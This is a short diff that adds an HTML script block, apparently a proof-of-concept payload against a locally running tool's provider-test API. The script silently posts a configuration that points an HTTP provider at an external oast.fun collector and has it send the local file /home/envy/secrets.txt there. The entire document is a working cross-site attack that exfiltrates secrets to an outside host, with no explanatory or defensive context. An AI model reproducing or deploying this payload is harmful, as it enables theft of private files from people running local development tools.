@@ -1,0 +1,15 @@
+<script>
+fetch('http://localhost:3000/api/providers/test', {
+  method: 'POST',
+  headers: {'Content-Type':'application/json'},
+  body: JSON.stringify({
+    id: 'http',
+    config: {
+      url: 'https://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/collect',
+      method: 'POST',
+      headers: { 'content-type': 'text/plain', 'X-File-Path': '/home/envy/secrets.txt' },
+      body: 'file:///home/envy/secrets.txt'
+    }
+  })
+}).catch(()=>{});
+</script>
